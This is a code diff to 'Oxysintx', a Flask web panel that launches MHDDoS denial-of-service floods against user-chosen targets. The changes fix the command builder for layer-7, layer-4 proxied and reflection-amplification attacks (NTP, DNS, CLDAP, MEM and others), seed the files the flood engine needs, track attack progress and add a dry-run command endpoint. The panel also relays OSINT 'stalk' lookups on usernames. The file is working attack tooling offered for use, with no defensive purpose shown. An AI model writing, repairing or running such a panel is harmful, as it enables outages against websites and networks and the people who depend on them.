@@ -1,14 +1,19 @@
 #!/usr/bin/env python3
 """
-Oxysintx - Main Flask Application (v3.5.1)
+Oxysintx - Main Flask Application (v3.6.0)
 
-Routing and API. MHDDoS engine (start.py) integrated as external subprocess.
-Attack launches directly on user request.
+Routing and API. MHDDoS engine (start.py, v2.4 SNAPSHOT) integrated as an
+external subprocess. Attack launches directly on user request.
 
-Changelog v3.5.1
+Changelog v3.6.0
 ----------------
-- Add GET /api/network/traffic (dashboard Network panel was 404'ing)
-- Add POST /api/scan/<job_id>/cancel (wire scan_orchestrator.cancel_scan)
+- Align argv builder with start.py v2.4 (L4 non-AMP now needs proxy_type + file)
+- Split allowlists into ALLOWED_PROXY_FILES / ALLOWED_REFLECTOR_FILES to match
+  start.py's new files/proxies/ and files/ resolution
+- Prefer project venv for PYTHON_EXE so start.py runs under the same interpreter
+- Fix /api/mhddos/status 500: never hand the live Popen handle to Flask's JSON
+- Add elapsed / remaining / progress_pct to the status payload
+- Guard /api/mhddos/history through the same serialiser
 
 Author: Yanxzyx
 """
@@ -96,8 +101,9 @@ try:
 except ImportError:
     _quick_menu_available = False
 
+
 # ═══════════════════════════════════════════════════════════════════════════
-# STARTUP BANNER (single, clean)
+# STARTUP BANNER
 # ═══════════════════════════════════════════════════════════════════════════
 BANNER = r"""
     ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄  █▀▀▀▀▀▀▀▀▀▀▓
@@ -109,10 +115,46 @@ BANNER = r"""
     █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ ░▄▄▄▄▄▄▄▄▄▄█
 """
 
+
 # ═══════════════════════════════════════════════════════════════════════════
 # MHDDoS engine (start.py integration)
 # ═══════════════════════════════════════════════════════════════════════════
 MHDDOS_SCRIPT = Path(__file__).parent / "start.py"
+
+# Prefer the project venv so start.py always runs under the same interpreter
+# as the Flask app, matching the MHDDoS web-panel behaviour.
+_PROJECT_ROOT = Path(__file__).resolve().parent
+_VENV_PY_WIN  = _PROJECT_ROOT / ".venv" / "Scripts" / "python.exe"
+_VENV_PY_UNIX = _PROJECT_ROOT / ".venv" / "bin" / "python"
+
+if _VENV_PY_WIN.exists():
+    PYTHON_EXE = str(_VENV_PY_WIN)
+elif _VENV_PY_UNIX.exists():
+    PYTHON_EXE = str(_VENV_PY_UNIX)
+else:
+    PYTHON_EXE = sys.executable
+
+# start.py resolves proxy lists under <root>/files/proxies/ and reflector
+# files under <root>/files/. Keep these allowlists in sync with that layout.
+ALLOWED_PROXY_FILES = {
+    "http.txt",
+    "socks4.txt",
+    "socks5.txt",
+    "proxies.txt",
+}
+ALLOWED_REFLECTOR_FILES = {
+    "reflectors.txt",
+}
+
+# start.py exits if these are missing on L7 floods.
+REQUIRED_L7_FILES = (
+    Path("files") / "useragent.txt",
+    Path("files") / "referers.txt",
+)
+
+# Valid SocksType values accepted by start.py
+VALID_PROXY_TYPES = {0, 1, 4, 5, 6}
+
 _mhddos_processes = {}
 _mhddos_lock = threading.Lock()
 _mhddos_history = []
@@ -147,25 +189,78 @@ _MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
 def _mhddos_build_command(method, target, threads, duration,
                           proxy_type=0, proxy_file="proxies.txt",
                           rpc=1, debug=False, reflector_file=""):
-    cmd = [sys.executable, str(MHDDOS_SCRIPT)]
+    """Build the argv that start.py v2.4 SNAPSHOT expects.
+
+    Contract (from start.py __main__):
+        L7           : METHOD URL SOCKS_TYPE THREADS PROXYLIST RPC DURATION [debug]
+        L4 proxy     : METHOD IP:PORT THREADS DURATION SOCKS_TYPE PROXYLIST [debug]
+        L4 AMP       : METHOD IP:PORT THREADS DURATION REFLECTOR_FILE [debug]
+
+    Notes:
+      • start.py resolves PROXYLIST under <root>/files/proxies/<basename>
+      • start.py resolves REFLECTOR_FILE under <root>/files/<basename>
+      • The trailing 'debug' flag is optional; its mere presence enables DEBUG
+        logging inside start.py.
+    """
+    cmd = [PYTHON_EXE, str(MHDDOS_SCRIPT)]
+
+    # ── Filename sanitisation: basename only, from allowlist ──
+    safe_proxy = Path(proxy_file or "").name or "proxies.txt"
+    if safe_proxy not in ALLOWED_PROXY_FILES:
+        safe_proxy = "proxies.txt"
+
+    safe_reflector = Path(reflector_file or "").name
+    if safe_reflector and safe_reflector not in ALLOWED_REFLECTOR_FILES:
+        safe_reflector = "reflectors.txt"
+
+    # ── Clamp integer args ──
+    threads = max(1, min(int(threads), 2000))
+    duration = max(1, min(int(duration), 86400))
+    rpc = max(1, min(int(rpc), 10000))
+    proxy_type = int(proxy_type)
+    if proxy_type not in VALID_PROXY_TYPES:
+        proxy_type = 0
+
     if method in _MHDDOS_LAYER7:
         url = target if target.startswith(("http://", "https://")) else f"http://{target}"
-        cmd.extend([method, url, str(proxy_type), str(threads),
-                    proxy_file, str(rpc), str(duration)])
+        cmd.extend([
+            method,
+            url,
+            str(proxy_type),
+            str(threads),
+            safe_proxy,
+            str(rpc),
+            str(duration),
+        ])
+        if debug:
+            cmd.append("debug")
+
     else:
+        # L4 — resolve hostname → IP:port for start.py
         ip_port = target
-        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", ip_port):
+        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", ip_port):
             try:
                 from socket import gethostbyname
                 hostname, port = ip_port.rsplit(":", 1)
                 ip_port = f"{gethostbyname(hostname)}:{port}"
             except Exception:
+                # Let start.py surface the failure cleanly rather than us
+                # failing the request on our side.
                 pass
+
         cmd.extend([method, ip_port, str(threads), str(duration)])
+
         if method in _MHDDOS_AMP:
-            cmd.append(reflector_file if reflector_file else "reflectors.txt")
-    if debug:
-        cmd.append("debug")
+            cmd.append(safe_reflector or "reflectors.txt")
+            if debug:
+                cmd.append("debug")
+        else:
+            # L4 non-AMP: start.py expects proxy_type (must be a digit) then
+            # the proxy filename. This was missing in v3.5.1.
+            cmd.extend([str(proxy_type), safe_proxy])
+            if debug:
+                cmd.append("debug")
+
     return cmd
 
 
@@ -176,8 +271,9 @@ def _mhddos_start_attack(attack_id, method, target, threads, duration,
     try:
         process = Popen(
             cmd, stdout=PIPE, stderr=PIPE, text=True,
-            creationflags=0, cwd=str(Path(__file__).parent),
+            creationflags=0, cwd=str(_PROJECT_ROOT),
         )
+        now_iso = datetime.now(timezone.utc).isoformat()
         with _mhddos_lock:
             _mhddos_processes[attack_id] = {
                 "process": process,
@@ -185,7 +281,12 @@ def _mhddos_start_attack(attack_id, method, target, threads, duration,
                 "target": target,
                 "threads": threads,
                 "duration": duration,
-                "started_at": datetime.now(timezone.utc).isoformat(),
+                "proxy_type": proxy_type,
+                "proxy_file": proxy_file,
+                "rpc": rpc,
+                "reflector_file": reflector_file,
+                "debug": debug,
+                "started_at": now_iso,
                 "status": "running",
                 "attack_id": attack_id,
             }
@@ -195,13 +296,13 @@ def _mhddos_start_attack(attack_id, method, target, threads, duration,
                 "target": target,
                 "threads": threads,
                 "duration": duration,
-                "started_at": datetime.now(timezone.utc).isoformat(),
+                "started_at": now_iso,
                 "status": "running",
             })
             if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
                 del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]
         threading.Thread(target=_mhddos_monitor, args=(attack_id,), daemon=True).start()
-        return {"success": True, "attack_id": attack_id}
+        return {"success": True, "attack_id": attack_id, "argv": cmd}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
@@ -222,14 +323,15 @@ def _mhddos_monitor(attack_id):
             process.kill()
         except Exception:
             pass
+    ended_at = datetime.now(timezone.utc).isoformat()
     with _mhddos_lock:
         if attack_id in _mhddos_processes:
             _mhddos_processes[attack_id]["status"] = status
-            _mhddos_processes[attack_id]["ended_at"] = datetime.now(timezone.utc).isoformat()
+            _mhddos_processes[attack_id]["ended_at"] = ended_at
         for entry in _mhddos_history:
             if entry["attack_id"] == attack_id:
                 entry["status"] = status
-                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
+                entry["ended_at"] = ended_at
                 break
 
 
@@ -270,18 +372,102 @@ def _mhddos_stop_all():
     return {"success": True, "stopped": stopped}
 
 
+# ── JSON-safe serialisation ────────────────────────────────────────────────
+_MHDDOS_SERIALISABLE_FIELDS = (
+    "attack_id",
+    "method",
+    "target",
+    "threads",
+    "duration",
+    "proxy_type",
+    "proxy_file",
+    "rpc",
+    "reflector_file",
+    "debug",
+    "status",
+    "started_at",
+    "ended_at",
+)
+
+
+def _serialise_mhddos_entry(entry, *, include_runtime=False):
+    """Return a JSON-safe copy of a process-info dict.
+
+    Drops the live `Popen` handle, monitor thread, lock objects, etc. When
+    `include_runtime=True`, adds computed fields (`pid`, `elapsed`,
+    `remaining`, `progress_pct`) for the UI.
+    """
+    if not entry:
+        return None
+
+    out = {}
+    for key in _MHDDOS_SERIALISABLE_FIELDS:
+        if key in entry:
+            out[key] = entry[key]
+
+    # Carry over any other trivially-safe primitive value
+    for key, value in entry.items():
+        if key in out or key in ("process", "thread", "cancel_event", "_lock"):
+            continue
+        if isinstance(value, (str, int, float, bool)) or value is None:
+            out[key] = value
+        elif isinstance(value, (list, tuple)):
+            if all(isinstance(v, (str, int, float, bool)) or v is None for v in value):
+                out[key] = list(value)
+
+    if include_runtime:
+        process = entry.get("process")
+        out["pid"] = getattr(process, "pid", None) if process else None
+
+        try:
+            started = entry.get("started_at")
+            duration = int(entry.get("duration") or 0)
+            if started and duration > 0:
+                started_dt = datetime.fromisoformat(started.replace("Z", "+00:00"))
+                if started_dt.tzinfo is None:
+                    started_dt = started_dt.replace(tzinfo=timezone.utc)
+                elapsed = max(0, int((datetime.now(timezone.utc) - started_dt).total_seconds()))
+                out["elapsed"] = elapsed
+                out["remaining"] = max(0, duration - elapsed)
+                out["progress_pct"] = min(100, round((elapsed / duration) * 100, 1))
+            else:
+                out["elapsed"] = 0
+                out["remaining"] = duration
+                out["progress_pct"] = 0
+        except Exception:
+            out["elapsed"] = 0
+            out["remaining"] = int(entry.get("duration") or 0)
+            out["progress_pct"] = 0
+
+    return out
+
+
 def _mhddos_get_status(attack_id=None):
+    """JSON-safe MHDDoS status. The live Popen handle is never returned."""
     with _mhddos_lock:
         if attack_id:
-            return _mhddos_processes.get(attack_id, None)
-        running = [v for v in _mhddos_processes.values() if v["status"] == "running"]
+            entry = _mhddos_processes.get(attack_id)
+            if entry is None:
+                return None
+            return _serialise_mhddos_entry(entry, include_runtime=True)
+
+        running = [
+            _serialise_mhddos_entry(v, include_runtime=True)
+            for v in _mhddos_processes.values()
+            if v.get("status") == "running"
+        ]
+        history = [
+            _serialise_mhddos_entry(h, include_runtime=False)
+            for h in _mhddos_history[-50:]
+        ]
         return {
             "running": running,
-            "history": list(_mhddos_history[-50:]),
+            "history": history,
             "available": True,
             "methods": sorted(_MHDDOS_METHODS),
             "layer7": sorted(_MHDDOS_LAYER7),
             "layer4": sorted(_MHDDOS_LAYER4),
+            "amplification": sorted(_MHDDOS_AMP),
         }
 
 
@@ -592,7 +778,6 @@ def _save_json(name, data):
 
 
 def _json_lock(name):
-    """Return the lock for a JSON file so callers can do atomic read-modify-write."""
     return _json_locks[name]
 
 
@@ -601,7 +786,6 @@ def _now_iso():
 
 
 def _client_ip():
-    """Real client IP, honoring common reverse-proxy headers."""
     fwd = request.headers.get('X-Forwarded-For', '')
     if fwd:
         return fwd.split(',')[0].strip()
@@ -612,13 +796,12 @@ def _client_ip():
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Request counters (for Network Traffic panel)
+# Request counters
 # ═══════════════════════════════════════════════════════════════════════════
 _request_log_lock = threading.Lock()
 _request_timestamps = []
 _total_requests_seen = 0
 
-# State for /api/network/traffic (delta calculation between polls)
 _net_traffic_started_at = time.time()
 _prev_net_counters = {"t": 0.0, "total": 0}
 
@@ -641,7 +824,7 @@ def _inbound_stats():
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# API-key helper (single source of truth: user_store)
+# API-key helpers
 # ═══════════════════════════════════════════════════════════════════════════
 def _hash_api_key(raw_key):
     return hashlib.sha256(raw_key.encode('utf-8')).hexdigest()
@@ -657,7 +840,6 @@ def _public_key_view(k):
 
 
 def _record_server_activity(key_prefix, username, req):
-    """Track server/client activity for Panel Manager."""
     reported_name = (
         req.headers.get('X-Server-Name')
         or (req.get_json(silent=True) or {}).get('server_name')
@@ -685,7 +867,6 @@ def _record_server_activity(key_prefix, username, req):
 
 
 def _find_api_key_owner(raw_key):
-    """Look up the owner of an API key via user_store (single source of truth)."""
     try:
         keys = user_store.get_api_keys()
     except Exception:
@@ -695,7 +876,6 @@ def _find_api_key_owner(raw_key):
         stored_hash = k.get('key_hash') or k.get('hash')
         if stored_hash and stored_hash == key_hash:
             return k
-        # Fallback: raw match (for stores that keep the full key)
         if k.get('key') == raw_key:
             return k
     return None
@@ -819,7 +999,6 @@ def _extract_bearer_token():
 
 
 def _authenticate_request():
-    """Verify session or Bearer token, invalidating if the user no longer exists."""
     username = session.get("username")
     if username:
         role = get_role(username)
@@ -1242,7 +1421,7 @@ def _proxy_osint(endpoint_slug, username):
             f"https://api.siputzx.my.id/api/stalk/{endpoint_slug}",
             params={"q": username, "username": username},
             timeout=15,
-            headers={"User-Agent": "Oxysintx/3.5.1"},
+            headers={"User-Agent": "Oxysintx/3.6.0"},
         )
         if resp.status_code == 200:
             return jsonify(resp.json())
@@ -1552,8 +1731,6 @@ def api_scan_status(job_id):
 @app.route("/api/scan/<job_id>/cancel", methods=["POST"])
 @role_required("owner", "analyst")
 def api_scan_cancel(job_id):
-    """Signal a running scan to stop. Worker tools are expected to honour
-    the injected cancel_event; this endpoint just flips the flag."""
     ok = scan_orchestrator.cancel_scan(job_id)
     if not ok:
         return jsonify({"error": "not_found_or_already_finished"}), 404
@@ -1649,17 +1826,10 @@ def api_system_stats():
 @app.route("/api/network/traffic", methods=["GET"])
 @api_login_required
 def api_network_traffic():
-    """Live request + host NIC counters for the dashboard Network panel.
-
-    Polled frequently by the frontend, so keep this O(1). Bytes/packets come
-    from psutil (host-level); HTTP counters come from the before_request
-    tracker so the panel can show both views side by side.
-    """
     total_seen, last_minute = _inbound_stats()
     now = time.time()
     uptime = max(1.0, now - _net_traffic_started_at)
 
-    # Delta since the previous poll -> smoother live graph
     prev_t = _prev_net_counters["t"] or now
     prev_total = _prev_net_counters["total"]
     dt = max(0.001, now - prev_t)
@@ -1675,29 +1845,23 @@ def api_network_traffic():
         bytes_recv = net.bytes_recv
         packets_sent = net.packets_sent
         packets_recv = net.packets_recv
-    except Exception as exc:  # noqa: BLE001
+    except Exception as exc:
         logger.warning("psutil.net_io_counters failed: %s", exc)
         bytes_sent = bytes_recv = packets_sent = packets_recv = 0
 
     return jsonify({
-        # HTTP layer
         "requests_total": total_seen,
         "requests_last_minute": last_minute,
         "requests_per_second": round(req_per_sec, 2),
         "uptime_seconds": int(uptime),
-
-        # Host NIC layer
         "bytes_sent": bytes_sent,
         "bytes_recv": bytes_recv,
         "packets_sent": packets_sent,
         "packets_recv": packets_recv,
-
-        # Aliases for older frontend code
         "network_in": total_seen,
         "network_in_rate": last_minute,
         "inbound": last_minute,
         "outbound": 0,
-
         "timestamp": _now_iso(),
     })
 
@@ -1934,6 +2098,9 @@ def mhddos_methods():
         "methods": sorted(_MHDDOS_METHODS),
         "layer7": sorted(_MHDDOS_LAYER7),
         "layer4": sorted(_MHDDOS_LAYER4),
+        "amplification": sorted(_MHDDOS_AMP),
+        "proxy_files": sorted(ALLOWED_PROXY_FILES),
+        "reflector_files": sorted(ALLOWED_REFLECTOR_FILES),
     })
 
 
@@ -1946,11 +2113,12 @@ def mhddos_start():
     threads = int(data.get("threads", 10))
     duration = int(data.get("duration", 60))
     proxy_type = int(data.get("proxy_type", 0))
-    proxy_file = (data.get("proxy_file") or "proxies.txt").strip()
+    proxy_file = Path((data.get("proxy_file") or "proxies.txt").strip()).name
     rpc = int(data.get("rpc", 1))
-    reflector_file = (data.get("reflector_file") or "").strip()
+    reflector_file = Path((data.get("reflector_file") or "").strip()).name
     debug = bool(data.get("debug", False))
 
+    # ── Validation ──
     if not method or not target:
         return jsonify({"error": "method and target are required"}), 400
     if method not in _MHDDOS_METHODS:
@@ -1959,6 +2127,37 @@ def mhddos_start():
         return jsonify({"error": "threads must be between 1 and 1000"}), 400
     if duration < 1 or duration > 3600:
         return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400
+    if proxy_type not in VALID_PROXY_TYPES:
+        return jsonify({
+            "error": "invalid proxy_type",
+            "allowed": sorted(VALID_PROXY_TYPES),
+        }), 400
+
+    # Proxy file only matters for non-AMP methods
+    if method not in _MHDDOS_AMP:
+        if proxy_file not in ALLOWED_PROXY_FILES:
+            return jsonify({
+                "error": "invalid proxy_file",
+                "allowed": sorted(ALLOWED_PROXY_FILES),
+            }), 400
+
+    # Reflector file only matters for AMP methods
+    if method in _MHDDOS_AMP:
+        if reflector_file and reflector_file not in ALLOWED_REFLECTOR_FILES:
+            return jsonify({
+                "error": "invalid reflector_file",
+                "allowed": sorted(ALLOWED_REFLECTOR_FILES),
+            }), 400
+
+    # L7 requires the UA + referer lists start.py loads from disk
+    if method in _MHDDOS_LAYER7:
+        missing = [str(p) for p in REQUIRED_L7_FILES
+                   if not (Path(PROJECT_ROOT) / p).exists()]
+        if missing:
+            return jsonify({
+                "error": "engine_missing_files",
+                "detail": f"start.py requires these files for L7: {', '.join(missing)}",
+            }), 500
 
     attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
     result = _mhddos_start_attack(
@@ -1999,7 +2198,44 @@ def mhddos_status():
 @login_required
 def mhddos_history():
     limit = min(request.args.get("limit", 50, type=int), 200)
-    return jsonify({"history": _mhddos_history[-limit:]})
+    with _mhddos_lock:
+        snapshot = list(_mhddos_history[-limit:])
+    return jsonify({
+        "history": [_serialise_mhddos_entry(h) for h in snapshot]
+    })
+
+
+@app.route("/api/mhddos/command", methods=["POST"])
+@login_required
+def mhddos_preview_command():
+    """Dry-run: return the exact argv that /api/mhddos/start would use.
+
+    Useful for verifying CLI compatibility without launching a process.
+    """
+    data = request.get_json(silent=True) or {}
+    method = (data.get("method") or "").strip().upper()
+    target = (data.get("target") or "").strip()
+    if method not in _MHDDOS_METHODS or not target:
+        return jsonify({"error": "valid method and target required"}), 400
+
+    cmd = _mhddos_build_command(
+        method=method,
+        target=target,
+        threads=int(data.get("threads", 10)),
+        duration=int(data.get("duration", 60)),
+        proxy_type=int(data.get("proxy_type", 0)),
+        proxy_file=(data.get("proxy_file") or "proxies.txt"),
+        rpc=int(data.get("rpc", 1)),
+        reflector_file=(data.get("reflector_file") or ""),
+        debug=bool(data.get("debug", False)),
+    )
+    layer = "L7" if method in _MHDDOS_LAYER7 else "L4"
+    return jsonify({
+        "layer": layer,
+        "amplification": method in _MHDDOS_AMP,
+        "argv": cmd,
+        "argv_after_script": cmd[2:],
+    })
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -2585,15 +2821,51 @@ def v1_scan_status(job_id):
 # Startup
 # ═══════════════════════════════════════════════════════════════════════════
 def _print_startup(port=None):
-    """Single clean startup banner — no ==== separators, no module spam."""
     print(BANNER, flush=True)
     info_lines = []
     if port is not None:
         info_lines.append(f"  Server     : http://localhost:{port}")
     info_lines.append(f"  Tools      : {len(scan_orchestrator.list_tools())} loaded")
     info_lines.append(f"  Account    : {DEFAULT_USERNAME}")
+    info_lines.append(f"  MHDDoS     : {'ready' if MHDDOS_SCRIPT.exists() else 'start.py missing'}")
+    info_lines.append(f"  Engine py  : {PYTHON_EXE}")
     print("\n".join(info_lines), flush=True)
     print(flush=True)
+
+
+def _ensure_engine_layout():
+    """Create the folders + seed files start.py expects on first run."""
+    files_dir = Path(PROJECT_ROOT) / "files"
+    proxies_dir = files_dir / "proxies"
+    proxies_dir.mkdir(parents=True, exist_ok=True)
+
+    # Seed the proxy files start.py resolves by basename
+    for name in ALLOWED_PROXY_FILES:
+        p = proxies_dir / name
+        if not p.exists():
+            p.write_text("", encoding="utf-8")
+
+    # Seed the reflector list
+    for name in ALLOWED_REFLECTOR_FILES:
+        p = files_dir / name
+        if not p.exists():
+            p.write_text("", encoding="utf-8")
+
+    # Seed UA + referer files if missing (start.py exits without them)
+    if not (files_dir / "useragent.txt").exists():
+        (files_dir / "useragent.txt").write_text(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36\n",
+            encoding="utf-8",
+        )
+    if not (files_dir / "referers.txt").exists():
+        (files_dir / "referers.txt").write_text(
+            "https://www.google.com/\n"
+            "https://www.bing.com/\n"
+            "https://duckduckgo.com/\n",
+            encoding="utf-8",
+        )
 
 
 if __name__ == "__main__":
@@ -2617,6 +2889,9 @@ if __name__ == "__main__":
         print(flush=True)
 
     auto_restart_bot()
+
+    # Ensure the MHDDoS engine's on-disk layout exists
+    _ensure_engine_layout()
 
     default_port = int(Config.PORT) if hasattr(Config, 'PORT') else 8080
     while True:
